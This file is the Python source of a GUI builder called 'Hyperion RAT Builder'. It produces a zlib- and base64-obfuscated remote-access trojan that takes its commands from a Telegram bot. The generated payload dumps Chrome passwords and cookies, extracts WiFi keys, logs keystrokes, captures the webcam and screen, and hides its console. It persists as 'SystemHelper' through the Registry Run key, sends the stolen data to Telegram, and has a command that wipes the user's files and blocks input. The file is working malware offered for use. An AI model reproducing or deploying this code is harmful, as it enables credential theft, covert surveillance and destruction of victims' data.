import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import base64
import zlib
import os

THEME_BG = "#000000"
THEME_TEXT = "#ffff00"
THEME_ACCENT = "#00ffff"

FEATURES = [
    ("webcam",      "Webcam snapshot (webcam)"),
    ("sslog",       "Screenshot capture (sslog)"),
    ("iplog",       "IP address logging (iplog)"),
    ("wifilog",     "WiFi/network passwords (wifilog)"),
    ("syslog",      "System information (syslog)"),
    ("passdump",    "Chrome saved passwords (passdump)"),
    ("cookiedump",  "Chrome cookies dump (cookiedump)"),
    ("keylogger",   "Keylogger start/stop (startkeylog / stopkeylog)"),
    ("processes",   "List running processes (processes)"),
    ("killproc",    "Kill process by name (killproc <name>)"),
    ("shutdown",    "Shutdown PC (shutdown)"),
    ("restart",     "Restart PC (restart)"),
    ("wallpaper",   "Change wallpaper from URL (wallpaper <url>)"),
    ("rapepc",      "Destructive wipe + disruption (rapepc)"),
    ("persistence", "Add persistence (Registry Run - Windows only)"),
]

def obfuscate_code(code):
    compressed = zlib.compress(code.encode('utf-8'))
    b64 = base64.b64encode(compressed).decode('ascii')
    return f"""import zlib,base64;exec(zlib.decompress(base64.b64decode('{b64}')).decode('utf-8'))"""

def generate_payload():
    token = entry_token.get().strip()
    chat_id = entry_chatid.get().strip()
    
    if not token or not chat_id:
        messagebox.showerror("Error", "Telegram Bot Token and Chat ID are required!")
        return
    
    selected_features = {feat[0]: var.get() for feat, var in feature_vars.items()}
    
    imports = [
        "import os, sys, time, platform, subprocess, socket, threading, requests",
        "import pyautogui, cv2, win32api, win32con, ctypes, shutil, sqlite3, win32crypt",
        "from datetime import datetime",
        "from PIL import ImageGrab",
        "import psutil",
        "import urllib.request",
        "import getpass"
    ]
    
    if selected_features.get("keylogger"):
        imports.append("import pynput.keyboard as kb")
    
    if selected_features.get("persistence"):
        imports.extend(["import winreg", "import sys"])

    payload_code = f"""import os, sys, time, platform, subprocess, socket, threading, requests, pyautogui, cv2, win32api, win32con, ctypes, shutil, sqlite3, win32crypt
from datetime import datetime
from PIL import ImageGrab
import psutil
import urllib.request
import getpass
{'import pynput.keyboard as kb' if selected_features.get("keylogger") else ''}
{'import winreg, sys' if selected_features.get("persistence") else ''}

TELEGRAM_TOKEN = '{token}'
CHAT_ID = '{chat_id}'
BASE_URL = f'https://api.telegram.org/bot{{TELEGRAM_TOKEN}}'

def tg_send(msg=None, file=None, caption=None):
    try:
        if file:
            with open(file, 'rb') as f:
                files = {{'document': f}} if caption else {{'photo': f}}
                data = {{'chat_id': CHAT_ID}}
                if caption: data['caption'] = caption
                url = f'{{BASE_URL}}/sendDocument' if caption else f'{{BASE_URL}}/sendPhoto'
                requests.post(url, data=data, files=files)
        elif msg:
            requests.get(f'{{BASE_URL}}/sendMessage', params={{'chat_id': CHAT_ID, 'text': msg}})
    except:
        pass

PERSISTENCE_FLAG = os.path.join(os.getenv('TEMP', '/tmp'), 'hyper_persisted.flag')

def add_persistence():
    if platform.system() != "Windows":
        return
    try:
        if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
            current_path = sys.executable
        else:
            current_path = os.path.abspath(sys.argv[0] if sys.argv else __file__)
        appdata = os.getenv('APPDATA')
        ext = ".exe" if getattr(sys, 'frozen', False) else ".pyw"
        hidden_name = f"SystemHelper{{ext}}"
        dest_path = os.path.join(appdata, hidden_name)
        if not os.path.exists(dest_path) or os.path.getsize(dest_path) != os.path.getsize(current_path):
            shutil.copy2(current_path, dest_path)
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "SystemHelper", 0, winreg.REG_SZ, f'"{dest_path}"')
        winreg.CloseKey(reg_key)
        tg_send("Persistence installed")
    except:
        tg_send("Persistence failed")

if '{selected_features.get("persistence", False)}' == 'True' and not os.path.exists(PERSISTENCE_FLAG):
    add_persistence()
    try:
        with open(PERSISTENCE_FLAG, 'w') as f:
            f.write("1")
    except:
        pass

def get_system_info():
    info = []
    info.append(f"Username: {{getpass.getuser()}}")
    info.append(f"OS: {{platform.system()}} {{platform.release()}} ({{platform.machine()}})")
    info.append(f"Processor: {{platform.processor()}}")
    info.append(f"Hostname: {{socket.gethostname()}}")
    try:
        info.append(f"Public IP: {{requests.get('https://api.ipify.org', timeout=6).text}}")
    except:
        info.append("Public IP: failed")
    return '\\n'.join(info)

def get_wifi_profiles():
    try:
        out = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
        profiles = [i.split(':')[1][1:-1] for i in out.split('\\n') if 'All User Profile' in i]
        result = []
        for profile in profiles:
            pwd_out = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name={{profile}}', 'key=clear'], stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
            pwd = [line.split(':')[1][1:] for line in pwd_out.split('\\n') if 'Key Content' in line]
            result.append(f"{{profile}}: {{pwd[0] if pwd else 'None'}}")
        return '\\n'.join(result) or "No WiFi profiles found"
    except:
        return "Failed to retrieve WiFi info"

def dump_chrome_passwords():
    try:
        path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        if not os.path.exists(path): return "Chrome Login Data not found"
        shutil.copy(path, 'temp_logins.db')
        conn = sqlite3.connect('temp_logins.db')
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        result = []
        for row in cursor.fetchall():
            try:
                pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                result.append(f"{{row[0]}} | {{row[1]}} | {{pwd}}")
            except:
                pass
        conn.close()
        os.remove('temp_logins.db')
        return '\\n'.join(result) or "No saved passwords found"
    except:
        return "Password dump error"

def dump_chrome_cookies():
    try:
        path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
        if not os.path.exists(path): return "Chrome Cookies not found"
        shutil.copy(path, 'temp_cookies.db')
        conn = sqlite3.connect('temp_cookies.db')
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        result = []
        for row in cursor.fetchall():
            try:
                value = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                result.append(f"{{row[0].decode()}} | {{row[1].decode()}} | {{value}}")
            except:
                pass
        conn.close()
        os.remove('temp_cookies.db')
        with open('cookies.txt', 'w', encoding='utf-8') as f:
            f.write('\\n'.join(result))
        return len(result)
    except:
        return "Cookie dump error"

keylog_buffer = []
keylog_running = False
listener = None

def on_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(str(key).replace("'", ""))
    except:
        keylog_buffer.append("[ERR]")

def start_keylogger():
    global keylog_running, listener
    if keylog_running: return
    keylog_running = True
    listener = kb.Listener(on_press=on_press)
    listener.start()
    tg_send("Keylogger started")

def stop_keylogger():
    global keylog_running, listener, keylog_buffer
    if not keylog_running: return
    keylog_running = False
    if listener: listener.stop()
    if keylog_buffer:
        tg_send("Keylog dump:\\n" + ''.join(keylog_buffer))
        keylog_buffer = []

def execute_command(cmd):
    cmd_lower = cmd.strip().lower()
    parts = cmd_lower.split()
    base_cmd = parts[0] if parts else ""
    try:
        if base_cmd == "webcam" and {selected_features.get('webcam', False)}:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("cam.jpg", frame)
                tg_send("Webcam capture", "cam.jpg")
                os.remove("cam.jpg")
            cap.release()
        elif base_cmd == "sslog" and {selected_features.get('sslog', False)}:
            img = ImageGrab.grab()
            img.save("ss.png")
            tg_send("Screenshot", "ss.png")
            os.remove("ss.png")
        elif base_cmd == "iplog" and {selected_features.get('iplog', False)}:
            ip = requests.get('https://api.ipify.org', timeout=8).text
            tg_send(f"Victim IP: {{ip}}")
        elif base_cmd == "wifilog" and {selected_features.get('wifilog', False)}:
            wifi = get_wifi_profiles()
            tg_send(f"WiFi credentials:\\n{{wifi}}")
        elif base_cmd == "syslog" and {selected_features.get('syslog', False)}:
            info = get_system_info()
            tg_send(f"System Information:\\n{{info}}")
        elif base_cmd == "passdump" and {selected_features.get('passdump', False)}:
            result = dump_chrome_passwords()
            tg_send(f"Chrome Passwords:\\n{{result}}")
        elif base_cmd == "cookiedump" and {selected_features.get('cookiedump', False)}:
            count_or_err = dump_chrome_cookies()
            if isinstance(count_or_err, int):
                tg_send(f"Dumped {{count_or_err}} cookies")
                if os.path.exists("cookies.txt"):
                    tg_send("Cookies file", "cookies.txt", "cookies.txt")
                    os.remove("cookies.txt")
            else:
                tg_send(count_or_err)
        elif base_cmd == "startkeylog" and {selected_features.get('keylogger', False)}:
            start_keylogger()
        elif base_cmd == "stopkeylog" and {selected_features.get('keylogger', False)}:
            stop_keylogger()
        elif base_cmd == "processes" and {selected_features.get('processes', False)}:
            procs = [f"{{p.pid}} | {{p.name()}}" for p in psutil.process_iter(['pid','name'])][:60]
            tg_send("Running processes (top 60):\\n" + '\\n'.join(procs))
        elif base_cmd == "killproc" and {selected_features.get('killproc', False)} and len(parts) > 1:
            name = ' '.join(parts[1:]).strip()
            found = False
            for p in psutil.process_iter():
                if p.name().lower() == name.lower():
                    p.kill()
                    tg_send(f"Killed: {{name}}")
                    found = True
                    break
            if not found:
                tg_send(f"Process '{{name}}' not found")
        elif base_cmd == "shutdown" and {selected_features.get('shutdown', False)}:
            os.system("shutdown /s /t 5")
        elif base_cmd == "restart" and {selected_features.get('restart', False)}:
            os.system("shutdown /r /t 5")
        elif base_cmd == "wallpaper" and {selected_features.get('wallpaper', False)} and len(parts) > 1:
            url = ' '.join(parts[1:])
            try:
                urllib.request.urlretrieve(url, "wall.jpg")
                ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("wall.jpg"), 3)
                tg_send("Wallpaper changed")
            except:
                tg_send("Wallpaper change failed")
        elif base_cmd == "rapepc" and {selected_features.get('rapepc', False)}:
            user_dir = os.path.expanduser("~")
            for root, _, files in os.walk(user_dir):
                for file in files:
                    try: os.remove(os.path.join(root, file))
                    except: pass
            ctypes.windll.user32.BlockInput(True)
            tg_send("RapePC executed - files wiped, input blocked")
        else:
            tg_send("Unknown / disabled command")
    except Exception as e:
        tg_send(f"Command '{{cmd}}' failed: {{str(e)}}")

def poll_telegram():
    offset = 0
    while True:
        try:
            r = requests.get(f"{{BASE_URL}}/getUpdates", params={{'offset': offset, 'timeout': 30}}, timeout=40)
            data = r.json()
            if data.get('ok') and data.get('result'):
                for update in data['result']:
                    offset = update['update_id'] + 1
                    if 'message' in update and 'text' in update['message']:
                        text = update['message']['text'].strip()
                        if text.startswith('/'):
                            execute_command(text[1:])
                        else:
                            execute_command(text)
        except:
            time.sleep(6)

if __name__ == '__main__':
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    threading.Thread(target=poll_telegram, daemon=True).start()
    while True:
        time.sleep(3600)
"""

    obfuscated = obfuscate_code(payload_code)
    
    output_path = filedialog.asksaveasfilename(
        defaultextension=".pyw",
        filetypes=[("Python script", "*.pyw"), ("Python", "*.py")],
        title="Save Hyperion Payload"
    )
    if output_path:
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(obfuscated)
        messagebox.showinfo(
            "Success",
            f"Hyperion payload generated!\n\nSaved: {output_path}\n\n"
            "Recommended compile:\n"
            "pyinstaller --onefile --noconsole --name SystemHelper yourfile.pyw"
        )

root = tk.Tk()
root.title("Hyperion RAT Builder")
root.geometry("620x720")
root.configure(bg=THEME_BG)
root.resizable(False, False)

style = ttk.Style()
style.theme_use('clam')
style.configure("TLabel", background=THEME_BG, foreground=THEME_TEXT, font=("Consolas", 11))
style.configure("TCheckbutton", background=THEME_BG, foreground=THEME_TEXT, font=("Consolas", 10))
style.map("TCheckbutton", background=[("active", THEME_BG)], foreground=[("active", THEME_ACCENT)])
style.configure("TButton", font=("Consolas", 11, "bold"), background=THEME_ACCENT, foreground=THEME_BG)
style.map("TButton", background=[("active", THEME_TEXT)], foreground=[("active", THEME_BG)])
style.configure("TEntry", fieldbackground=THEME_BG, foreground=THEME_ACCENT, insertcolor=THEME_ACCENT)

tk.Label(root, text="HYPERION", font=("Consolas", 22, "bold"), bg=THEME_BG, fg=THEME_ACCENT).pack(pady=(20, 0))
tk.Label(root, text="RAT BUILDER", font=("Consolas", 14), bg=THEME_BG, fg=THEME_ACCENT).pack()

desc_frame = tk.Frame(root, bg=THEME_BG, bd=1, relief="solid")
desc_frame.pack(padx=25, pady=15, fill="x")
tk.Label(desc_frame, text="Hyperion – modular Telegram RAT\nSelect features.\nPersistence: %APPDATA% + Run key (Windows)\nC2: Telegram Bot", justify="left", bg=THEME_BG, fg=THEME_TEXT, font=("Consolas", 10)).pack(padx=12, pady=10)

frame_c2 = tk.Frame(root, bg=THEME_BG)
frame_c2.pack(padx=30, pady=10, fill="x")

tk.Label(frame_c2, text="Telegram Bot Token:", bg=THEME_BG, fg=THEME_TEXT).grid(row=0, column=0, sticky="w", pady=6)
entry_token = ttk.Entry(frame_c2, width=52)
entry_token.grid(row=0, column=1, pady=6)

tk.Label(frame_c2, text="Chat ID:", bg=THEME_BG, fg=THEME_TEXT).grid(row=1, column=0, sticky="w", pady=6)
entry_chatid = ttk.Entry(frame_c2, width=52)
entry_chatid.grid(row=1, column=1, pady=6)

frame_features = tk.LabelFrame(root, text=" ENABLED FEATURES ", bg=THEME_BG, fg=THEME_ACCENT, font=("Consolas", 11, "bold"))
frame_features.pack(padx=30, pady=15, fill="x")

feature_vars = {}
for i, (key, label) in enumerate(FEATURES):
    var = tk.BooleanVar(value=True)
    feature_vars[key] = var
    cb = ttk.Checkbutton(frame_features, text=label, variable=var)
    cb.grid(row=i//2, column=i%2, sticky="w", padx=20, pady=4)

btn_generate = ttk.Button(root, text="GENERATE PAYLOAD", command=generate_payload)
btn_generate.pack(pady=25, ipadx=30, ipady=12)

root.mainloop()
